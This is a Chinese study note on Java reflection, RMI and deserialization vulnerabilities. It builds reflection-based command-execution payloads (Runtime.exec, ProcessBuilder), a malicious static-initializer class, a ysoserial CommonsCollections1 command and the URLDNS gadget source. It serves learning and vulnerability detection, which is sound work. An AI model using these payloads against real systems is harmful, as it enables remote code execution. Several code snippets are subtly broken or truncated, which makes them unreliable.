---
title: java反序列化
date: 20 25-02-18 14:22:11
tags: 
      - java
      - 反序列化
categories: 学习笔记
---

java反序列化的基础就是反射，所以我们先从反射开始

### 反射

#### 什么是反射

反射允许对封装类的字段，方法和构造函数的信息进行编程访问

![image-20250218164622512](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502181646735.png)

#### 获取class对象的三种方式

1.Class.forName(全类名)  最为常用的

2.类名.class  当做参数进行传递

3.对象.getClass();

![image-20250218165756402](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502181657494.png)



#### 获取构造方法

![image-20250218170101029](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502181701119.png)

先获取class对象，再获取构造方法

```java
Class clazz=Class.forName("全类名");
Constructor[] cons1=clazz.getConstructors();
for(Constructor con:cons2){
System.out.println(con)
}
```

![image-20250218185506888](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502181855001.png)



#### 获取成员变量

![image-20250218185552296](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502181855366.png)

```java
Class clazz=Class.forName("全类名");
Field[] fie1=clazz.getConstructors();
for(Field field:fie2){
System.out.println(con)
}
```



#### 获取成员方法

![image-20250218191740079](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502181917171.png)





### java序列化和反序列化

#### 反射（1）

![image-20250218142342198](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502181423547.png)

Java 序列化和反序列化的实质本质上是对象与字节流之间的转换。也就是Java序列化是将对象转换为字节流以便存储或传输，反序列化则是将字节流转换回原对象的过程。

```java
public void execute(String className, String methodName) throws Exception {
 Class clazz = Class.forName(className);
 clazz.getMethod(methodName).invoke(clazz.newInstance());
}
```

在上面的代码中有几个反射里的重要的方法

forName: 获取类的方法

newInstance：实例化对象的方法

getMethod: 获得函数的方法

invoke： 用来执行函数

获取类的方法不只有`forName`,还有`obj.getclass()`、`Test.class`,他们都是属于`java.lang.Class`对象

> `forName`有两个函数重载：
>
> Class<?> forName(String name)
>
> Class<?> forName(String name, **boolean** initialize, ClassLoader loader)
>
> 第一个就是我们最常见的获取class的方式，其实可以理解为第二种方式的一个封装
>
> ```
> Class.forName(className) 
> 等于
> Class.forName(className,true,currentLoader)
> ```

接下来，我们来看看三个初始化方法有什么区别

```java
public class TrainPrint {
 {
     
 System.out.printf("Empty block initial %s\n", this.getClass());
     
 }
 
 static {
     
 System.out.printf("Static initial %s\n", TrainPrint.class);
     
 }
 
 public TrainPrint() {
     
 System.out.printf("Initial %s\n", this.getClass());
 }
    
}
```

我们在main函数内初始实例化这个类

```java
package src;

public class Main {
    public static void main(String[] args) {
        TrainPrint obj = new TrainPrint();  // 创建 类的实例
    }
}

```

从运行结果能够发现，先调用了static{}，其次是{}，最后是构造函数

其中， static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯，

但在当前构造函数内容的前⾯。

所以说， `forName` 中的 initialize=true 其实就是告诉Java虚拟机是否执⾏”类初始化“。

```java
public class TrainPrint {

 {

 System.out.printf("Empty block initial %s\n", this.getClass());

 }

 static {

 System.out.printf("Static initial %s\n", TrainPrint.class);

 }

 public TrainPrint() {

 System.out.printf("Initial %s\n", this.getClass());


```

那么，假设我们有如下函数，其中函数的参数name可控：

```java
public void ref(String name) throws Exception {

 Class.forName(name);

}
```

我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：

```java
import java.lang.Runtime;

import java.lang.Process;

public class TouchFile {

 static {

 try {

 Runtime rt = Runtime.getRuntime();

 String[] commands = {"touch", "/tmp/success"};

 Process pc = rt.exec(commands);

 pc.waitFor();

 } catch (Exception e) {

 // do nothing
```



#### 反射（2）

我们知道，java在正常情况下，除了系统类，我们想拿到另一个类要使用import，但使用forName就不需要，我们就可以通过它来加载任意类

获得类以后，我妈就需要继续使用反射来获取这个类的属性、方法，也可以实例化战鼓擂，并调用方法

java有个函数`class.newInstance()`用来调用这个类的无参构造方法

不过，有时候在写漏洞利用方面，会发现使用newInstance总是不成功，原因可能有:

1.类没有无参构造函数

2.类的构造函数是私有的

如果构造函数是私有的，我们可以通过`class.setAccessible(true)`来取消权限校验



最最最常见的情况就是` java.lang.Runtime` ，这个类在我们构造命令执行Payload的时候很常见，但

我们不能直接这样来执行命令

```java
Class clazz = Class.forName("java.lang.Runtime");

clazz.getMethod("exec", String.class).invoke(clazz.newInstance(), "id");
```

![image-20250226214533656](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502262145762.png)

得到了一个报错，原因是Runtime类的构造方法是私有的

为什么会有类的构造方法是私有的，这涉及到"单例模式"

比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取：

```java
public class TrainDB {
private static TrainDB instance = new TrainDB();
public static TrainDB getInstance() {
return instance;
}
private TrainDB() {
// 建立连接的代码...
}
}
```

这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。

我们只能通过` Runtime.getRuntime()` 来获取到 Runtime 对象。我们将上述Payload进行修改即可正常执行命令了：

```java
Class clazz = Class.forName("java.lang.Runtime");
clazz.getMethod("exec",String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz),
"calc.exe");
```

在这里，我们用到了getMethod函数和invoke函数

**getMethod**的作用是通过反射获取一个类的某个特定的成员方法。我们知道在Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表

> 我们来举个例子，假设我们有一个类 `MyClass`，其中有两个重载的 `greet` 方法，一个接收 `String` 类型参数，另一个接收 `int` 类型参数：
>
> ```java
> public class MyClass {
>     public void greet(String name) {
>         System.out.println("Hello, " + name);
>     }
> 
>     public void greet(int age) {
>         System.out.println("You are " + age + " years old.");
>     }
> }
> 
> ```
>
> 如果你想通过反射获取并调用这两个方法之一，你就需要传递正确的参数类型给 `getMethod`。下面是如何使用 `getMethod` 的示例代码：
>
> ```java
> import java.lang.reflect.Method;
> 
> public class ReflectionExample {
>     public static void main(String[] args) throws Exception {
>         MyClass myClass = new MyClass();
> 
>         // 获取 greet(String) 方法
>         Method method1 = MyClass.class.getMethod("greet", String.class);
>         method1.invoke(myClass, "Alice");
> 
>         // 获取 greet(int) 方法
>         Method method2 = MyClass.class.getMethod("greet", int.class);
>         method2.invoke(myClass, 25);
>     }
> }
> 
> ```

**invoke** 的作用是执行方法，它的第一个参数是：

- 如果这个方法是一个普通方法，那么第一个参数是类对象
- 如果这个方法是一个静态方法，那么第一个参数是类

这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]...) ，其实在反射里就是method.invoke([1], [2], [3], [4]...) 。

我们将上述命令执行的payload分解一下得到

```java
Class clazz = Class.forName("java.lang.Runtime");
Method execMethod = clazz.getMethod("exec", String.class);
Method getRuntimeMethod = clazz.getMethod("getRuntime");
Object runtime = getRuntimeMethod.invoke(clazz);
execMethod.invoke(runtime, "calc.exe");
```



#### 反射（3）

如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类?

我们使用一个新的反射方法:`getConstructor`

它和`getMethod`相似，`getConstructor` 它接收参数是类的构造函数列表，因为构造函数也支持重载，所以我们必须用参数列表类型才能确定一个构造函数

获取到构造方法后，我们使用`newInstance`来执行

比如，我们常用的另一种执行命令的方式ProcessBuilder,我们使用反射来获取构造函数，然后调用`start()`来执行命令

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
```

**`ProcessBuilder`**有两个构造函数：

```java
public ProcessBuilder(List<String> command)

public ProcessBuilder(String... command)
```

上面例子用到了第一个构造函数，所以我在`getConstructor`里传入的是List.class

但是，前面那个payload用到了强制类型转换，我们利用漏洞是没有这种语法的，所以我们还需要进行反射

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
```



#### RMI（1）

RMI是远程方法调用，它的目标和RPC其实是类似的，是让某个Java虚拟机上的对象调用另一个Java虚拟机中对象上的方法，不过RMI是Java独有的机制

我们来举一个例子

```java
package org.vulhub.RMI;

import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {

    // 定义远程接口，继承 Remote 接口
    public interface IRemoteHelloWorld extends Remote {
        // 定义远程方法 hello()
        public String hello() throws RemoteException;
    }

    // 远程对象实现类，继承 UnicastRemoteObject
    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld {
        
        // 构造函数，抛出 RemoteException
        protected RemoteHelloWorld() throws RemoteException {
            super();
        }

        // 实现远程方法 hello()
        public String hello() throws RemoteException {
            // 输出调用信息到控制台
            System.out.println("call from remote client");
            return "Hello world";
        }
    }

    // 启动 RMI 服务的方法
    private void start() throws Exception {
        // 创建远程对象
        RemoteHelloWorld helloWorld = new RemoteHelloWorld();
        
        // 创建并启动 RMI 注册表，端口为 1099
        LocateRegistry.createRegistry(1099);
        
        // 将远程对象绑定到注册表，命名为 "rmi://127.0.0.1:1099/Hello"
        Naming.rebind("rmi://127.0.0.1:1099/Hello", helloWorld);
    }

    // 主函数，启动 RMI 服务器
    public static void main(String[] args) throws Exception {
        // 创建 RMI 服务器实例并启动
        new RMIServer().start();
    }
}

```

一个RMI Sever分为三部分:

1.一个继承了`java.rmi.Remote`的接口，其中定义我们要远程调用的函数，比如这里的hello()

2.一个实现了此接口的类

3.一个主类，用来穿件Registry，并将上面的类实例化后绑定到一个地址。这就是我们所谓的Server了

接着我们编写一个RMI Client:

```java
package org.vulhub.Train;

import org.vulhub.RMI.RMIServer;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class TrainMain {

    public static void main(String[] args) {
        try {
            // 使用 Naming.lookup() 查找远程对象并获取其引用
            RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)
                    Naming.lookup("rmi://192.168.135.142:1099/Hello");
            
            // 调用远程对象的方法并获取返回结果
            String ret = hello.hello();
            
            // 输出返回结果
            System.out.println(ret);
        } catch (RemoteException e) {
            // 处理远程异常
            e.printStackTrace();
        } catch (NotBoundException e) {
            // 处理对象未绑定异常
            e.printStackTrace();
        } catch (Exception e) {
            // 处理其他异常
            e.printStackTrace();
        }
    }
}

```

客户端就简单很多，使用Naming.lookup在Registry中寻找到名字Hello的对象，后面的使用就和在本地使用一样了

虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。

为了理解RMI的通信过程，我们⽤wireshark抓包看看

![image-20250304142607944](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503041426036.png)

这就是完整的通信过程，我们可以发现，整个过程进⾏了两次TCP握⼿，也就是我们实际建⽴了两次TCP连接。

第⼀次建⽴TCP连接是连接远端 192.168.135.142 的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆者进⾏沟通后，我向远端发送了⼀个“Call”消息，远端回复了⼀个“ReturnData”消息，然后我新建了⼀个TCP连接，连到远端的33769端⼝。

那么为什么我会连接33769端⼝呢？

细细阅读数据包我们会发现，在“ReturnData”这个包中，返回了⽬标的IP地址 192.168.135.142 ，其后跟的⼀个字节 \x00\x00\x83\xE9 ，刚好就是整数 

33769 的⽹络序列：

```
0030 .. .. .. .. .. .. .. ac ed 00 05 77 0f 01 18 35 ......Q....w...5
0040 cf d9 00 00 01 6c 39 4f ec 84 80 08 73 7d 00 00 .....l9O....s}..
0050 00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d ....java.rmi.Rem
0060 6f 74 65 00 2a 6f 72 67 2e 76 75 6c 68 75 62 2e ote.*org.vulhub.
0070 52 4d 49 2e 52 4d 49 53 65 72 76 65 72 24 49 52 RMI.RMIServer$IR
0080 65 6d 6f 74 65 48 65 6c 6c 6f 57 6f 72 6c 64 70 emoteHelloWorldp
0090 78 72 00 17 6a 61 76 61 2e 6c 61 6e 67 2e 72 65 xr..java.lang.re
00a0 66 6c 65 63 74 2e 50 72 6f 78 79 e1 27 da 20 cc flect.Proxy.'. .
00b0 10 43 cb 02 00 01 4c 00 01 68 74 00 25 4c 6a 61 .C....L..ht.%Lja
00c0 76 61 2f 6c 61 6e 67 2f 72 65 66 6c 65 63 74 2f va/lang/reflect/
00d0 49 6e 76 6f 63 61 74 69 6f 6e 48 61 6e 64 6c 65 InvocationHandle
00e0 72 3b 70 78 70 73 72 00 2d 6a 61 76 61 2e 72 6d r;pxpsr.-java.rm
00f0 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65 4f i.server.RemoteO
0100 62 6a 65 63 74 49 6e 76 6f 63 61 74 69 6f 6e 48 bjectInvocationH
0110 61 6e 64 6c 65 72 00 00 00 00 00 00 00 02 02 00 andler..........
0120 00 70 78 72 00 1c 6a 61 76 61 2e 72 6d 69 2e 73 .pxr..java.rmi.s
0130 65 72 76 65 72 2e 52 65 6d 6f 74 65 4f 62 6a 65 erver.RemoteObje
0140 63 74 d3 61 b4 91 0c 61 33 1e 03 00 00 70 78 70 ct.a...a3....pxp
0150 77 38 00 0a 55 6e 69 63 61 73 74 52 65 66 00 0f w8..UnicastRef..
0160 31 39 32 2e 31 36 38 2e 31 33 35 2e 31 34 32 00 192.168.135.142.
0170 00 83 e9 1b 78 c2 0b 23 a0 69 c0 18 35 cf d9 00 ....x..#.i..5...
0180 00 01 6c 39 4f ec 84 80 01 01 78 ..l9O.....x
```

其实这段数据流中从 \xAC\xED 开始往后就是Java序列化数据了，IP和端⼝只是这个对象的⼀部分罢了。

所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.168.135.142:33769 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello() 。

我们借⽤下图来说明这些元素间的关系：

![image-20250304143856155](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503041438253.png)

RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name

到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI

Server；最后，远程⽅法实际上在RMI Server上调⽤。

#### 反序列化（1）

Java反序列化和PHP的反序列化其实有些类似，他们都只将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化时再按照这个格式将属性拿回来，在赋值给新的对象

但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。

Java在序列化时一个对象，将会调用这个对象中的writeobject方法，参数类型是ObjectOutputStream，开发者可以将任何内容写入这个stream中，反序列化时，会调用readobject，开发者也可以从中读取出前面写入的内容，并进行处理

我们举个例子

Person.java

```java
package org.vulhub.Ser;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Person implements Serializable {
    public String name;
    public int age;

    // 构造函数
    Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    // 自定义序列化方法
    private void writeObject(ObjectOutputStream s) throws IOException {
        s.defaultWriteObject();  // 默认序列化对象
        s.writeObject("This is an object");  // 写入自定义信息
    }

    // 自定义反序列化方法
    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();  // 默认反序列化对象
        String message = (String) s.readObject();  // 读取自定义信息
        System.out.println(message);  // 打印自定义信息
    }
}

}
```

Main.java

```java
package src;

import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {
            // 创建一个 Person 对象
            Person person = new Person("Alice", 30);

            // 序列化对象到文件
            FileOutputStream fileOut = new FileOutputStream("person.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(person);
            out.close();
            fileOut.close();

            System.out.println("Person object serialized to person.ser");

            // 反序列化对象
            FileInputStream fileIn = new FileInputStream("person.ser");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            Person deserializedPerson = (Person) in.readObject();
            in.close();
            fileIn.close();

            System.out.println("Person object deserialized");
            System.out.println("Name: " + deserializedPerson.name);
            System.out.println("Age: " + deserializedPerson.age);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}

```

可见，我这里在执行完默认的 s.defaultWriteObject() 后，我向stream里写入了一个字符串 This  is an object 。

![image-20250228192803068](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502281928138.png)

我们写入的This is a object 被放在 objectAnnotation 的位置。

![](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502281940659.png)

在反序列化时，我读取了这个字符串，并将其输出了，这个特性就让Java的开发变得非常灵活



#### 反序列化（2）

##### ysoserial

在说反序列化漏洞利用链前，我们需要知道一个工具[ysoserial](https://github.com/frohoff/ysoserial)

ysoserial可以让用户根据自己选择的利用链，生成反序列化数据，通过讲这些数据发送给目标，从而执行用户的命令

什么是利⽤链？

利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了

ysoserial的使用很简单，虽然我们暂时不理解CommonsCollections利用链，但使用 ysoserial可以很容易生成这个gadget对应的POC:

```
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 "id" 1
```

如上，ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是 id 。⽣成好的POC发送给⽬标，如果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令 id 将被执⾏。

##### URLDNS

URLDNS是ysoserial中一个利用链的名字，但准确来说，这个其实不能称作"利用链"。因为其参数不是一个可以利用的命令，而仅作为一个URL，其能触发的结果也不是命令执行，而是一次DNS请求

虽然这个“利用链”实际上是不能利用的，但因为其如下优点，非常适合我们在检测反序列化漏洞时使用

- 使⽤Java内置的类构造，对第三⽅库没有依赖
- 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞

所以是用来检测是否存在java反序列化?

我们打开https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java看看ysoserial是如何⽣成 URLDNS 的代码的：

```java
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```



##### 利用链分析

我们看到URLDNS类的getObject方法，ysoserial会调用这个方法获得payload。这个方法返回的是一个对象，这个对象就是最后将被序列化的对象，在这里是HashMap

我们前面说了，触发反序列化的方法是readObject，因为Java开发者(包括Java内置库的开发者)经常会在这里面写自己的逻辑，所以导致可以构造利用链

那么，我们可以直奔HashMap类的readObject方法:

```java
/**
 * 从流中重建 {@code HashMap} 实例（即反序列化）。
 */
private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
    // 读取默认字段（阈值、负载因子和任何隐藏字段）
    s.defaultReadObject();
    
    // 重新初始化内部状态
    reinitialize();
    
    // 验证负载因子，确保它在有效范围内
    if (loadFactor <= 0 || Float.isNaN(loadFactor)) {
        throw new InvalidObjectException("非法的负载因子: " + loadFactor);
    }
    
    // 读取并忽略桶的数量
    s.readInt();
    
    // 读取映射的数量（HashMap 的大小）
    int mappings = s.readInt();
    
    // 验证映射数量，避免出现非法值
    if (mappings < 0) {
        throw new InvalidObjectException("非法的映射数量: " + mappings);
    } else if (mappings > 0) {
        // 如果有映射，基于负载因子计算表的大小
        // 确保负载因子在有效范围内（0.25 到 4.0）
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        
        // 基于映射数量和负载因子计算容量
        float fc = (float) mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY :
                    (fc >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY :
                    tableSizeFor((int) fc));
        
        // 根据容量和负载因子计算阈值
        float ft = (float) cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY)
                ? (int) ft : Integer.MAX_VALUE);
        
        // 使用计算的容量初始化表
        @SuppressWarnings({"rawtypes", "unchecked"})
        Node<K, V>[] tab = (Node<K, V>[]) new Node[cap];
        table = tab;

        // 读取键和值，并将它们插入到 HashMap 中
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
            K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
            V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}

```

在53行的位置，可以看到将HashMap的键名计算了hash:

```java
putVal(hash(key), key, value, false, false);
```

